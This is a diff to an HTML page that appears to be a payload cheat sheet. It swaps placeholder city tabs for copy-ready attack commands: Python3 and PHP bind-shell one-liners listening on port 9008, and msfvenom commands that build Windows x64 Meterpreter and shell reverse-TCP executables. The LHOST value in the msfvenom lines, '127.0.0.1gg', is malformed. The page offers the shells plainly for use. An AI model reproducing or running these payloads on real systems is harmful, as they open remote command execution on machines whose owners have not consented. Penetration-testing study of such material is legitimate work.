@@ -97,7 +97,7 @@ body {
 }
 
 .float-child {
-    width: 50%;
+    width: 100%;
     float: left;
     padding: 20px;
      
@@ -334,31 +334,38 @@ result.textContent = `  ${event.target.value}`;
 <div class="float-child">
 
 <div class="tab">
-  <button class="tablinks" onclick="City(event, 'London')" id="defaultOpen">London</button>
-  <button class="tablinks" onclick="City(event, 'Paris')">Paris</button>
-  <button class="tablinks" onclick="City(event, 'Tokyo')">Tokyo</button>
+  <button class="tablinks" onclick="City(event, 'Python3 Bind')" id="defaultOpen">Python3 Bind</button>
+  <button class="tablinks" onclick="City(event, 'PHP Bind')">PHP Bind</button>
 </div>
 
-<div id="London" class="tabcontent">
+<div id="Python3 Bind" class="tabcontent">
 <div class="float-child">
-  <h3 class="w3-text-theme">   <form>
-     <label for="command">Command:</label> 
-  <input type="text" id="command" name="command">
-  </form>
+  <h3 class="w3-text-theme w3-large w3-display-container"> 
+  
+  <p>
+  python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,
+  s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",9008));s1.listen(1);c,a=s1.accept();
+while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,
+stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+</p>
   </div>
 </div>
 
-<div id="Paris" class="tabcontent">
-  
-</div>
 
-<div id="Tokyo" class="tabcontent">
-
+<div id="PHP Bind" class="tabcontent">
+<div class="float-child">
+  <h3 class="w3-text-theme w3-large w3-display-container"> 
+  <p> 
+  php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",9008);
+  socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd))
+  {$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'
+  </p>
+ 
 </div>
+ 
 </div>
 
  
-</div>
  </div>
 </div>
 </div>
@@ -370,26 +377,26 @@ result.textContent = `  ${event.target.value}`;
 <div class="float-child">
 
 <div class="tab">
-  <button class="tablinks" onclick="City(event, 'London')" id="defaultOpen">London</button>
-  <button class="tablinks" onclick="City(event, 'Paris')">Paris</button>
-  <button class="tablinks" onclick="City(event, 'Tokyo')">Tokyo</button>
+  <button class="tablinks" onclick="City(event, 'WMSR')" id="defaultOpen">Windows Meterpreter Staged Reverse TCP (x64)</button>
+  <button class="tablinks" onclick="City(event, 'WMSlessR')">Windows Meterpreter Stageless Reverse TCP (x64)</button>
+  <button class="tablinks" onclick="City(event, 'WSR')">Windows Staged Reverse TCP (x64)</button>
 </div>
 
-<div id="London" class="tabcontent">
+<div id="WMSR" class="tabcontent">
 <div class="float-child">
-  <h3 class="w3-text-theme">   <form>
-     <label for="command">Command:</label> 
-  <input type="text" id="command" name="command">
-  </form>
+  <h3 class="w3-text-theme w3-large w3-display-container">    
+   <p>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1gg LPORT=9008 -f exe -o reverse.exe</p>
   </div>
 </div>
 
-<div id="Paris" class="tabcontent">
-  
+<div id="WMSlessR" class="tabcontent">
+ <h3 class="w3-text-theme w3-large w3-display-container">    
+  <p>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1gg LPORT=9008 -f exe -o reverse.exe</p>
 </div>
 
-<div id="Tokyo" class="tabcontent">
-
+<div id="WSR" class="tabcontent">
+ <h3 class="w3-text-theme w3-large w3-display-container">    
+<p> msfvenom -p windows/x64/shell/reverse_tcp LHOST=127.0.0.1gg LPORT=9008 -f exe -o reverse.exe</p>
 </div>
 </div>
 
@@ -463,3 +470,4 @@ function variable()
 </script>
 
 </body>
+</html>
